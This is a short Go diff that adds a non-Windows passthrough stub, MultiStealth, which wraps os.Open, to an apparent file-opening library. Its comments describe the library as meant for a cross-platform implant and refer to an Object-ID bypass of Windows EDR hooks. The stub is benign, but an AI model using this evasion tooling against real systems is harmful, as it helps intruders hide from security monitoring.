@@ -21,3 +21,15 @@ func NewStealth(_ string) (*Stealth, error) { return nil, errUnsupported }
 
 // VolumeFromPath always returns errUnsupported on non-Windows.
 func VolumeFromPath(_ string) (string, error) { return "", errUnsupported }
+
+// MultiStealth on non-Windows degrades silently to os.Open so a
+// cross-platform implant can wire `&stealthopen.MultiStealth{}` into
+// any Opener slot without conditional logic. The Object-ID bypass
+// only matters under Windows EDRs that hook path-based file APIs;
+// elsewhere there is nothing to bypass.
+type MultiStealth struct{}
+
+// Open implements [Opener] by delegating to os.Open. The cache /
+// ObjectID machinery is Windows-only; on other platforms Open is a
+// straight passthrough.
+func (m *MultiStealth) Open(path string) (*os.File, error) { return os.Open(path) }
